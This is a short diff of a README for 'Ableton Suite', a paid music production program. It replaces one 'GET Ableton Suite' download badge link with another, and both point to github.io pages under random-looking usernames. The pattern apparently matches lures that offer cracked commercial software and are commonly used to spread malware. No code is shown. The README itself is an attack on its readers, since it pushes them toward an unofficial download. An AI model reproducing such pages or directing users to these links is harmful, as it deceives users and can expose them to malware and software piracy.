@@ -1,6 +1,6 @@
 # Ableton Suite - Complete Music Production and Live Performance DAW
 
-[![GET Ableton Suite](https://img.shields.io/badge/GET%20%E2%80%94%20Ableton%20Suite-0078D6?style=for-the-badge&logoColor=white)](https://bodenbishopocfv.github.io/.github/ableton-suite)
+[![GET Ableton Suite](https://img.shields.io/badge/GET%20%E2%80%94%20Ableton%20Suite-0078D6?style=for-the-badge&logoColor=white)](https://elliotdillonrluv.github.io/.github/ableton-12-suite)
 
 ## Complete Studio View
 
